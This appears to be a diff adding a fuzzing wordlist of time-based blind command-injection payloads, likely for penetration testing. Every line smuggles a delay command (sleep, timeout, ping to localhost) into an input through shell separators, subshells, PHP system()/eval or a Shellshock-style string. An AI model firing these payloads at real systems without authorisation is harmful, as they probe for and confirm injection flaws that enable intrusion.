+&&sleep 20;
+&&sleep 20%00
+&&sleep 20#
+&&system('sleep 20')&
+&&system('sleep 20')&&
+&&system('sleep 20')|
+&&system('sleep 20')||
+&&system('sleep 20');
+&&system('sleep 20')%00
+&&system('sleep 20')#
+&&timeout 20&
+&&timeout 20&&
+&&timeout 20|
+&&timeout 20||
+&&timeout 20;
+&&timeout 20%00
+&&timeout 20#
+&&ping -c 20 127.0.0.1&
+&&ping -c 20 127.0.0.1&&
+&&ping -c 20 127.0.0.1|
+&&ping -c 20 127.0.0.1||
+&&ping -c 20 127.0.0.1;
+&&ping -c 20 127.0.0.1%00
+&&ping -c 20 127.0.0.1#
+&&(ping -c 20 127.0.0.1)&
+&&(ping -c 20 127.0.0.1)&&
+&&(ping -c 20 127.0.0.1)|
+&&(ping -c 20 127.0.0.1)||
+&&(ping -c 20 127.0.0.1);
+&&(ping -c 20 127.0.0.1)%00
+&&(ping -c 20 127.0.0.1)#
+&&$(ping -c 20 127.0.0.1)&
+&&$(ping -c 20 127.0.0.1)&&
+&&$(ping -c 20 127.0.0.1)|
+&&$(ping -c 20 127.0.0.1)||
+&&$(ping -c 20 127.0.0.1);
+&&$(ping -c 20 127.0.0.1)%00
+&&$(ping -c 20 127.0.0.1)#
+&&`ping -c 20 127.0.0.1`&
+&&`ping -c 20 127.0.0.1`&&
+&&`ping -c 20 127.0.0.1`|
+&&`ping -c 20 127.0.0.1`||
+&&`ping -c 20 127.0.0.1`;
+&&`ping -c 20 127.0.0.1`%00
+&&`ping -c 20 127.0.0.1`#
+&&{ping -c 20 127.0.0.1}&
+&&{ping -c 20 127.0.0.1}&&
+&&{ping -c 20 127.0.0.1}|
+&&{ping -c 20 127.0.0.1}||
+&&{ping -c 20 127.0.0.1};
+&&{ping -c 20 127.0.0.1}%00
+&&{ping -c 20 127.0.0.1}#
+&&${`ping -c 20 127.0.0.1`}&
+&&${`ping -c 20 127.0.0.1`}&&
+&&${`ping -c 20 127.0.0.1`}|
+&&${`ping -c 20 127.0.0.1`}||
+&&${`ping -c 20 127.0.0.1`};
+&&${`ping -c 20 127.0.0.1`}%00
+&&${`ping -c 20 127.0.0.1`}#
+{${sleep(20)}}
+{${sleep(hexdec(dechex(20)))}}
+() { :;}; sleep 20
+eval('sleep 20')
+perl -e 'sleep(20)'
+<?php system("sleep 20");?>
+sleep(20)
+sleep 20
+system('sleep 20')
+timeout 20
+ping -c 20 127.0.0.1
+(ping -c 20 127.0.0.1)
+$(ping -c 20 127.0.0.1)
+`ping -c 20 127.0.0.1`
+{ping -c 20 127.0.0.1}
+${`ping -c 20 127.0.0.1`}
